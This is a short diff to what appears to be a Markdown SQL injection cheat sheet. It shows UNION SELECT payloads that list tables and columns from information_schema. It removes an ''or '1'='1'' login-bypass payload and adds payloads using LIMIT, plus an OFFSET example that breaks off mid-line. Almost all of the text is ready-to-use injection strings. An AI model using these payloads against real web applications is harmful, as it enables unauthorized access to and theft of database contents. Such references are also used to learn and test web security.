@@ -24,7 +24,11 @@
 1' union select 1,table_name,table_schema from information_schema.tables; -- - 
 1' union select 1,column_name,table_schema from information_schema.columns where table_name='tablename'; -- - 
 ```
-
-```sql
-'or '1'='1' or "='' and password = ''
+- Using LIMIT to limit number of rows to display
+```
+1' union select 1,column2,column3 from table_name LIMIT 1; -- - 
+```
+- Using OFFSET:
+```
+1' union select 1,column2,column3 from table_na
 ```
